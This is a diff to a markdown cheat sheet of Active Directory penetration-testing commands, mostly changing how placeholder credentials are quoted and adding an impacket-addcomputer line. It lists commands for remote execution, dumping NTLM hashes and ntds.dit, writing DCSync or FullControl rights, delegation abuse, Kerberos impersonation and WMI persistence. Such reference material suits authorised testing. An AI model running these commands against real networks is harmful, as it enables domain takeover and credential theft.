@@ -8,7 +8,7 @@
 - curl
 ```sh
 # upload
-curl -s -T 'FILE' --user 'USERNAME:PASSWORD' ftp://'IP'
+curl -s -T 'FILE' --user 'USERNAME':'PASSWORD' ftp://'IP'
 ```
 - nmap
 ```sh
@@ -33,7 +33,7 @@ scp 'LOCALPATH' 'USERNAME'@'IP':'FILEPATH'
 - ssh
 ```sh
 chmod 600 'SECRETKEY'
-ssh -i 'SECRETKEY' 'USERNAME@IP'
+ssh -i 'SECRETKEY' 'USERNAME'@'IP'
 # Local Port Forwarding
 ssh -L 'LISTENPORT':'FORARD_IP':'FORWARD_PORT' 'USERNAME'@'SSH_SERVER_IP'
 ```
@@ -111,9 +111,9 @@ certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP' -u 'USERNAME' -d 'DOMAIN'
 - impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
 - impacket-getST
 ```sh
-impacket-getST -spn 'SPN' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+impacket-getST -spn 'SPN' -ts -dc-ip 'IP' 'DOMAIN'/'USERNAME':'PASSWORD'
 # KCD
-impacket-getST -spn 'SPN' -impersonate 'USERNAME' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+impacket-getST -spn 'SPN' -impersonate 'USERNAME' -ts -dc-ip 'IP' 'DOMAIN'/'USERNAME':'PASSWORD'
 ```
 - impacket-GetUserSPNs
 - kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
@@ -163,7 +163,7 @@ certipy-ad shadow -account 'USERNAME' -dc-ip 'IP' -u 'USERNAME'@'DOMAIN' -p 'PAS
 - godap ![GitHub Repo stars](https://img.shields.io/github/stars/Macmod/godap?style=social)
 ```sh
 ./godap 'IP' -u 'USERNAME' -p 'PASSWORD'
-./godap 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD'
+./godap 'IP' -u 'USERNAME'@'DOMAIN' -p 'PASSWORD'
 ```
 - impacket-changepasswd
 ```sh
@@ -180,19 +180,19 @@ impacket-GetLAPSPassword -ts -dc-ip 'IP' 'DOMAIN'/'USERNAME':'PASSWORD'
 - impacket-dacledit
 ```sh
 # write
-impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
-impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
+impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN'/'USERNAME':'PASSWORD'
+impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN'/'USERNAME':'PASSWORD'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN'/'USERNAME':'PASSWORD'
 # read
 impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action read -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
 # remove
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN'/'USERNAME':'PASSWORD'
 ```
 - impacket-owneredit
 - impacket-rbcd
 ```sh
-impacket-rbcd -delegate-to 'COMPUTERNAME' -action 'read' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
-impacket-rbcd -delegate-to 'COMPUTERNAME' -delegate-from 'COMPUTERNAME' -action 'write' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+impacket-rbcd -delegate-to 'COMPUTERNAME$' -action 'read' -ts -dc-ip 'IP' 'DOMAIN'/'USERNAME':'PASSWORD'
+impacket-rbcd -delegate-to 'COMPUTERNAME$' -delegate-from 'COMPUTERNAME$' -action 'write' -ts -dc-ip 'IP' 'DOMAIN'/'USERNAME':'PASSWORD'
 ```
 - krbrelayx ![GitHub Repo stars](https://img.shields.io/github/stars/dirkjanm/krbrelayx?style=social)
 ```sh
@@ -204,7 +204,7 @@ python3.13 krbrelayx/dnstool.py -u 'DOMAIN\USERNAME' -p 'PASSWORD' -a add -r 'RE
 - LdapRelayScan ![GitHub Repo stars](https://img.shields.io/github/stars/zyn3rgy/LdapRelayScan?style=social)
 - ldapsearch
 ```sh
-ldapsearch -b 'DN' -LLL -s 'sub' -D 'USERNAME@DOMAIN' -H ldap://'IP' -w 'PASSWORD' 'FILTER' 'ATTRIBUTES'
+ldapsearch -b 'DN' -LLL -s 'sub' -D 'USERNAME'@'DOMAIN' -H ldap://'IP' -w 'PASSWORD' 'FILTER' 'ATTRIBUTES'
 ```
 - ldeep ![GitHub Repo stars](https://img.shields.io/github/stars/franc-pentest/ldeep?style=social)
 - msldap(yet) ![GitHub Repo stars](https://img.shields.io/github/stars/skelsec/msldap?style=social)
@@ -273,13 +273,16 @@ enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 - impacket
 ```sh
 # exec
-impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows or ShellBrowserWindow or MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
+impacket-psexec  -ts 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
+impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
+impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
+impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows or ShellBrowserWindow or MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
+impacket-atexec -ts 'DOMAIN'/'USERNAME':'PASSWORD'@'IP' 'COMMAND'
 ```
-- impacket-addcomputer 
+- impacket-addcomputer
+```sh
+impacket-addcomputer -computer-name 'COMPUTERNAME$' -computer-pass 'PASSWORD' -dc-ip 'IP' 'DOMAIN'/'USERNAME':'PASSWORD'
+```
 - impacket-Get-GPPPassword
 - impacket-lookupsid
 - impacket-machine_role
@@ -292,8 +295,8 @@ impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 - impacket-secretsdump
 ```sh
 # dumping NTLM hashs and Kerberos Keys
-impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-secretsdump -ts 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
+impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
 # local
 impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM -ntds ntds.dit LOCAL
 ```
@@ -301,7 +304,7 @@ impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM -ntds ntds.dit L
 - impacket-smbclient
 - impacket-wmipersist
 ```sh
-impacket-wmipersist 'DOMAIN/USERNAME:PASSWORD@IP' install -name 'NAME' -command "COMMAND"
+impacket-wmipersist 'DOMAIN'/'USERNAME':'PASSWORD'@'IP' install -name 'NAME' -command "COMMAND"
 ```
 - impacket-wmiquery
 - netexec
@@ -352,12 +355,12 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'C
 - smbclient
 ```sh
 smbclient -L 'IP' -N  
-smbclient -L 'IP' -U 'DOMAIN/USERNAME%PASSWORD'
-smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//IP/SHARE'
+smbclient -L 'IP' -U 'DOMAIN'/'USERNAME'%'PASSWORD'
+smbclient -U 'DOMAIN'/'USERNAME'%'NT HASH' --pw-nt-hash -c 'COMMAND' //'IP'/'SHARENAME'
 ```
 - smbget
 ```sh
-smbget --recursive -U 'DOMAIN/USERNAME%PASSWORD' smb://'IP'/'SHARENAME'
+smbget --recursive -U 'DOMAIN'/'USERNAME'%'PASSWORD' smb://'IP'/'SHARENAME'
 ```
 - smbmap ![GitHub Repo stars](https://img.shields.io/github/stars/ShawnDEvans/smbmap?style=social)
 ```sh
